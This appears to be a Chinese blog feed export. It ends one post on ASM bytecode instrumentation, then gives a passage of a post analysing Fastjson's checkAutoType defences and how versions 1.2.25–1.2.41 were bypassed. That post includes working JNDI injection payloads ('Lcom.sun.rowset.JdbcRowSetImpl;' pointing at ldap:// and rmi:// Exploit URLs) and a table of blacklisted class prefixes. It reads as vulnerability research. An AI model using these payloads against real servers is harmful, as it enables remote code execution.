<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyVisitor</span> <span class="keyword">extends</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MyVisitor</span><span class="params">(ClassVisitor cv)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(Opcodes.ASM5, cv);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String descriptor, String signature, String[] exceptions)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//return super.visitMethod(access, name, descriptor, signature, exceptions);</span></span><br><span class="line">            System.out.println(<span class="string">"====================="</span>);</span><br><span class="line">            System.out.println(<span class="string">"acce== "</span> + access);</span><br><span class="line">            System.out.println(<span class="string">"name== "</span> + name);</span><br><span class="line">            System.out.println(<span class="string">"desc== "</span> + descriptor);</span><br><span class="line">            System.out.println(<span class="string">"sign== "</span> + signature);</span><br><span class="line">            System.out.println(<span class="string">"====================="</span>);</span><br><span class="line"></span><br><span class="line">            MethodVisitor mv = <span class="keyword">super</span>.visitMethod(access, name, descriptor, signature, exceptions);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (name.equals(<span class="string">"run"</span>)) &#123;</span><br><span class="line">                mv = <span class="keyword">new</span> MyMethodVisitor(Opcodes.ASM5, mv);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (name.equals(<span class="string">"getValue"</span>)) &#123;</span><br><span class="line">                mv = <span class="keyword">new</span> MyMethodVisitorWithReturn(Opcodes.ASM5, mv);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> mv;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>理解：</p>
<ol>
<li>这里唯一重点就是重写了visitMethod方法。当我们的cv去访问class文件，只要遇到类方法，那么就会由visitMethod来响应。</li>
<li>在这个函数内部，我们首先来打印类方法的访问权限/名称/描述符/方法签名；</li>
<li>接下来，对于我们需要插桩的两个函数，run和getValue函数，分别进行响应，就有了第三部分；</li>
</ol>
<h2 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h2><p>MyMethodVisitor部分；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMethodVisitor</span> <span class="keyword">extends</span> <span class="title">MethodVisitor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        MyMethodVisitor(<span class="keyword">int</span> api, MethodVisitor mv) &#123;</span><br><span class="line">                <span class="keyword">super</span>(api, mv);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>.visitCode();</span><br><span class="line">            System.out.println(<span class="string">"start hack before"</span>);</span><br><span class="line">            hack(mv, <span class="string">"asm insert before"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInsn</span><span class="params">(<span class="keyword">int</span> opcode)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (opcode == Opcodes.RETURN) &#123;</span><br><span class="line">                System.out.println(<span class="string">"start hack after"</span>);</span><br><span class="line">                hack(mv, <span class="string">"asm insert after"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">super</span>.visitInsn(opcode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hack</span><span class="params">(MethodVisitor mv, String msg)</span> </span>&#123;</span><br><span class="line">            mv.visitFieldInsn(</span><br><span class="line">                    Opcodes.GETSTATIC,</span><br><span class="line">                    Type.getInternalName(System<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                    "out",</span><br><span class="line">                    Type.getDescriptor(PrintStream<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">            )</span>;</span><br><span class="line">            mv.visitLdcInsn(msg);</span><br><span class="line">            mv.visitMethodInsn(</span><br><span class="line">                    Opcodes.INVOKEVIRTUAL,</span><br><span class="line">                    Type.getInternalName(PrintStream<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                    "println",</span><br><span class="line">                    <span class="string">"(Ljava/lang/String;)V"</span>,</span><br><span class="line">                    <span class="keyword">false</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>MyMethodVisitorWithReturn部分：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMethodVisitorWithReturn</span> <span class="keyword">extends</span> <span class="title">MethodVisitor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MyMethodVisitorWithReturn</span><span class="params">(<span class="keyword">int</span> api, MethodVisitor mv)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(api, mv);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInsn</span><span class="params">(<span class="keyword">int</span> opcode)</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"opcode=="</span> + opcode);</span><br><span class="line">            <span class="keyword">if</span> (opcode == Opcodes.IRETURN) &#123;</span><br><span class="line">                hack(mv, <span class="string">"insert before return"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">super</span>.visitInsn(opcode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hack</span><span class="params">(MethodVisitor mv, String msg)</span> </span>&#123;</span><br><span class="line">            mv.visitFieldInsn(</span><br><span class="line">                    Opcodes.GETSTATIC,</span><br><span class="line">                    Type.getInternalName(System<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                    "out",</span><br><span class="line">                    Type.getDescriptor(PrintStream<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">            )</span>;</span><br><span class="line">            mv.visitLdcInsn(msg);</span><br><span class="line">            mv.visitMethodInsn(</span><br><span class="line">                    Opcodes.INVOKEVIRTUAL,</span><br><span class="line">                    Type.getInternalName(PrintStream<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                    "println",</span><br><span class="line">                    <span class="string">"(Ljava/lang/String;)V"</span>,</span><br><span class="line">                    <span class="keyword">false</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>理解：</p>
<p>先说第一个MyMethodVisitor部分，这个类也还是自定义的，重写了visitCode方法和visitInsn方法，分别进行插桩；</p>
<p>所谓插桩就是直接插入class内容，ASM已经封装好了，直接用插件看：</p>
<p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1ASM%E6%8F%92%E6%A1%A9/image-20200709173623320.png" alt="image-20200709173623320"></p>
<p>其实就是三行话，直接拿进来写。</p>
<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p>运行代码，直接看生成的damn.class：</p>
<p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1ASM%E6%8F%92%E6%A1%A9/image-20200709174536877.png" alt="image-20200709174536877"></p>
]]></content>
      <categories>
        <category>静态分析</category>
      </categories>
      <tags>
        <tag>ASM</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson抗争的一生</title>
    <url>/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>百川东到海，何时复西归？</p>
</blockquote>
<p>这一篇来总结Fastjson不同版本的bypass方式。</p>
<a id="more"></a>

<h1 id="1-2-24漏洞修复"><a href="#1-2-24漏洞修复" class="headerlink" title="1.2.24漏洞修复"></a>1.2.24漏洞修复</h1><p>在1.2.25版本，针对1.2.24版本进行了修复。</p>
<p>我们可以总结以下1.2.24版本的漏洞产生原因：</p>
<ol>
<li><code>@type</code>该关键词的特性会加载任意类，并给提供的输入字段的值进行恢复，如果字段有setter、getter方法会自动调用该方法，进行赋值，恢复出整个类。<br>这个过程会被叫做Fastjson的反序列化过程，注意不要把这个过程跟java反序列化过程混为一谈。它们两个是同等级的存在，而不是前者基于后者之上。也就是说readObject()反序列化利用点那一套在这根本不适用。相应的被屏蔽的type加载任意类+符合条件的setter与getter变成了反序列化利用点。</li>
<li>在找到可以调用的setter、getter之后，从这个可以被触发的setter、getter之后就可以沿着不同的反序列化利用链前进，比如具有一定限制条件的TemplatesImpl利用链，JNDI注入的利用链。</li>
<li>沿着链就会到最后的payload触发点。比如JNDI的远程恶意class文件的实例化操作（构造函数，静态方法）或调用类中getObjectInstance方法，与TemplatesImpl利用链中的class文件字节码的的实例化操作（构造函数，静态方法）。</li>
</ol>
<p>可以注意到最终的payload触发点具有好像是巧合的统一性，都类似于是一个class文件的实例化操作。在commons-collections中则是反射机制（这在被屏蔽的type中的getter、setter函数调用中也被用到）。应该对这两个点产生敏感性。</p>
<p>修复则是针对三要素中的一者进行截断。在1.2.25中的修复原理就是针对了反序列化漏洞触发点进行限制。对于<code>被屏蔽的type</code>标签进行一个白名单+黑名单的限制机制。</p>
<p>使用万能的idea对两个版本的jar包进行对比：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094428-69e0459c-2d01-1.jpg" alt="img"></p>
<p>可以注意到，在解析json串的<code>DefaultJSONParser类</code>中做了一行代码的修改。当输入的键值是<code>@type</code>时，原本直接对值对应的类进行加载。现在会将值ref传入<code>checkAutoType方法</code>中。</p>
<p>checkAutoType是1.2.25版本中新增的一个白名单+黑名单机制。同时引入一个配置参数<code>AutoTypeSupport</code>。参考<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">官方wiki</a></p>
<p>Fastjson默认AutoTypeSupport为False（开启白名单机制），通过需要服务端通过以下代码来显性修改：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>); （关闭白名单机制）</span><br></pre></td></tr></table></figure>

<p>可见，False为禁止自动转换，true为允许自动转换。</p>
<p>由于checkAutoType中两条路线的代码是穿插的，先来看默认<code>AutoTypeSupport</code>为False时的代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//一些固定类型的判断，此处不会对clazz进行赋值，此处省略</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="comment">//进行黑名单匹配，匹配中，直接报错退出</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny = denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//对白名单，进行匹配；如果匹配中，调用loadClass加载，赋值clazz直接返回</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept = acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//此处省略了当clazz不为null时的处理情况，与expectClass有关</span></span><br><span class="line">        <span class="comment">//但是我们这里输入固定是null，不执行此处代码</span></span><br><span class="line">        <span class="comment">//可以发现如果上面没有触发黑名单，返回，也没有触发白名单匹配中的话，就会在此处被拦截报错返回。</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//执行不到此处</span></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大体流程就是先过黑名单，再过白名单，要是都不适配，最后也会报错。</p>
<p>可以得出在默认的<code>AutoTypeSupport为False</code>时，要求不匹配到黑名单，同时必须匹配到白名单的class才可以成功加载。</p>
<p>看一下默认黑名单，默认白名单（最下面，默认为空）</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094428-6a060516-2d01-1.jpg" alt="img"></p>
<p>这条路完全被白名单堵死了,所以默认的情况下是不可能绕过的。我们的两个payload也都被com.sun这一条黑名单给匹配了。</p>
<h1 id="1-2-25-1-2-41绕过"><a href="#1-2-25-1-2-41绕过" class="headerlink" title="1.2.25-1.2.41绕过"></a>1.2.25-1.2.41绕过</h1><p>所以接下来所谓的绕过都是在服务端显性开启<code>AutoTypeSupport为True</code>的情况下进行的。（这是一个很大的限制条件）</p>
<p>我们先来看显性修改<code>AutoTypeSupport为True</code>时的代码：</p>
<p>1.2.25版本com.alibaba.fastjson.parser.ParserConfig#checkAutoType(关闭白名单机制) 也就是true。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//先进行白名单匹配，如果匹配成功则直接返回。可见所谓的关闭白名单机制是不只限于白名单</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept = acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           <span class="comment">//同样进行黑名单匹配，如果匹配成功，则报错推出。</span></span><br><span class="line">            <span class="comment">//需要注意这百年所谓的匹配都是startsWith开头匹配</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny = denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//一些固定类型的判断，不会对clazz进行赋值，此处省略</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//不匹配白名单中也不匹配黑名单的，进入此处，进行class加载</span></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//对于加载的类进行危险性判断，判断加载的clazz是否继承自Classloader与DataSource</span></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ClassLoader<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>) // <span class="title">classloader</span> <span class="title">is</span> <span class="title">danger</span></span></span><br><span class="line"><span class="class">                    || <span class="title">DataSource</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>) // <span class="title">dataSource</span> <span class="title">can</span> <span class="title">load</span> <span class="title">jdbc</span> <span class="title">driver</span></span></span><br><span class="line"><span class="class">                    ) </span>&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//返回加载的class</span></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见在显性关闭白名单的情况下，也需要绕过黑名单检测，同时加载的类不能继承自Classloader与DataSource。</p>
<p>看似只能找到其他的利用类跟黑名单进行硬刚。但再跟一下类的加载<code>TypeUtils.loadClass</code>就会有所发现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//特殊处理1！</span></span><br><span class="line">        <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//特殊处理2！</span></span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>)) &#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<ul>
<li><p>如果这个className是以<code>[</code>开头我们会去掉<code>[</code>进行加载！</p>
<p>但是实际上在代码中也可以看见它会返回Array的实例变成数组。在实际中它远远不会执行到这一步，在json串解析时就已经报错。</p>
</li>
<li><p>如果这个className是以<code>L</code>开头<code>;</code>结尾，就会去掉开头和结尾进行加载！</p>
</li>
</ul>
<p>那么加上<code>L</code>开头<code>;</code>结尾实际上就可以绕过所有黑名单。那么理所当然的payload就为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LDAP：</span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125;"</span>;</span><br><span class="line"></span><br><span class="line">RMI：</span><br><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"Lcom.sun.rowset.RowSetImpl;"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/Exploit"</span>,<span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>关键PoC为：<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>/<code>Lcom.sun.rowset.RowSetImpl;</code></p>
<p>注意是要开启AutoTypeSupport的，添加以下代码就ok了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br></pre></td></tr></table></figure>

<p>直接运行即可绕过checkAutoType()黑名单实现弹计算器：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706121236438.png" alt="image-20200706121236438"></p>
<h2 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>我们注意到，PoC和之前的不同之处在于在”com.sun.rowset.JdbcRowSetImpl”类名的前面加了”L”、后面加了”;”就绕过了黑名单过滤。</p>
<p>下面我们调试分析看看为啥会绕过。</p>
<p>我们将断点打在checkAutoType()函数上，调试跟进去，”Lcom.sun.rowset.JdbcRowSetImpl;”类名由于是以”L”开头，因此并不在denyList黑名单中，从而绕过了黑名单校验:</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706124435820.png" alt="image-20200706124435820"></p>
<p>再往下开始调用TypeUtils.loadClass()：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/3.png" alt="img"></p>
<p>跟进TypeUtils.loadClass()函数，这里我们在之前的文章中年已经调试分析过了，也提示过了，就是会有个判断条件判断类名是否以”L”开头、以”;”结尾，是的话就提取出其中的类名再加载进来，因此能成功绕过：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706125048392.png" alt="image-20200706125048392"></p>
<h1 id="1-2-42-漏洞修复"><a href="#1-2-42-漏洞修复" class="headerlink" title="1.2.42 漏洞修复"></a>1.2.42 漏洞修复</h1><p>自1.2.42版本开始，在ParserConfig.java中可以看到黑名单改为了哈希黑名单：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706125426393.png" alt="image-20200706125426393"></p>
<p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
<p>目前已知的哈希黑名单的对应表如下：</p>
<table>
<thead>
<tr>
<th>version</th>
<th>hash</th>
<th>hex-hash</th>
<th>name</th>
</tr>
</thead>
<tbody><tr>
<td>1.2.42</td>
<td>-8720046426850100497</td>
<td>0x86fc2bf9beaf7aefL</td>
<td>org.apache.commons.collections4.comparators</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-8109300701639721088</td>
<td>0x8f75f9fa0df03f80L</td>
<td>org.python.core</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-7966123100503199569</td>
<td>0x9172a53f157930afL</td>
<td>org.apache.tomcat</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-7766605818834748097</td>
<td>0x9437792831df7d3fL</td>
<td>org.apache.xalan</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-6835437086156813536</td>
<td>0xa123a62f93178b20L</td>
<td>javax.xml</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-4837536971810737970</td>
<td>0xbcdd9dc12766f0ceL</td>
<td>org.springframework.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-4082057040235125754</td>
<td>0xc7599ebfe3e72406L</td>
<td>org.apache.commons.beanutils</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-2364987994247679115</td>
<td>0xdf2ddff310cdb375L</td>
<td>org.apache.commons.collections.Transformer</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-1872417015366588117</td>
<td>0xe603d6a51fad692bL</td>
<td>org.codehaus.groovy.runtime</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-254670111376247151</td>
<td>0xfc773ae20c827691L</td>
<td>java.lang.Thread</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-190281065685395680</td>
<td>0xfd5bfc610056d720L</td>
<td>javax.net.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>313864100207897507</td>
<td>0x45b11bc78a3aba3L</td>
<td>com.mchange</td>
</tr>
<tr>
<td>1.2.42</td>
<td>1203232727967308606</td>
<td>0x10b2bdca849d9b3eL</td>
<td>org.apache.wicket.util</td>
</tr>
<tr>
<td>1.2.42</td>
<td>1502845958873959152</td>
<td>0x14db2e6fead04af0L</td>
<td>java.util.jar.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>3547627781654598988</td>
<td>0x313bb4abd8d4554cL</td>
<td>org.mozilla.javascript</td>
</tr>
<tr>
<td>1.2.42</td>
<td>3730752432285826863</td>
<td>0x33c64b921f523f2fL</td>
<td>java.rmi</td>
</tr>
<tr>
<td>1.2.42</td>
<td>3794316665763266033</td>
<td>0x34a81ee78429fdf1L</td>
<td>java.util.prefs.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>4147696707147271408</td>
<td>0x398f942e01920cf0L</td>
<td>com.sun.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>5347909877633654828</td>
<td>0x4a3797b30328202cL</td>
<td>java.util.logging.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>5450448828334921485</td>
<td>0x4ba3e254e758d70dL</td>
<td>org.apache.bcel</td>
</tr>
<tr>
<td>1.2.42</td>
<td>5751393439502795295</td>
<td>0x4fd10ddc6d13821fL</td>
<td>java.net.Socket</td>
</tr>
<tr>
<td>1.2.42</td>
<td>5944107969236155580</td>
<td>0x527db6b46ce3bcbcL</td>
<td>org.apache.commons.fileupload</td>
</tr>
<tr>
<td>1.2.42</td>
<td>6742705432718011780</td>
<td>0x5d92e6ddde40ed84L</td>
<td>org.jboss</td>
</tr>
<tr>
<td>1.2.42</td>
<td>7179336928365889465</td>
<td>0x63a220e60a17c7b9L</td>
<td>org.hibernate</td>
</tr>
<tr>
<td>1.2.42</td>
<td>7442624256860549330</td>
<td>0x6749835432e0f0d2L</td>
<td>org.apache.commons.collections.functors</td>
</tr>
<tr>
<td>1.2.42</td>
<td>8838294710098435315</td>
<td>0x7aa7ee3627a19cf3L</td>
<td>org.apache.myfaces.context.servlet</td>
</tr>
<tr>
<td>1.2.43</td>
<td>-2262244760619952081</td>
<td>0xe09ae4604842582fL</td>
<td>java.net.URL</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-8165637398350707645</td>
<td>0x8eadd40cb2a94443L</td>
<td>junit.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-8083514888460375884</td>
<td>0x8fd1960988bce8b4L</td>
<td>org.apache.ibatis.datasource</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-7921218830998286408</td>
<td>0x92122d710e364fb8L</td>
<td>org.osjava.sj.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-7768608037458185275</td>
<td>0x94305c26580f73c5L</td>
<td>org.apache.log4j.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-6179589609550493385</td>
<td>0xaa3daffdb10c4937L</td>
<td>org.logicalcobwebs.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-5194641081268104286</td>
<td>0xb7e8ed757f5d13a2L</td>
<td>org.apache.logging.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-3935185854875733362</td>
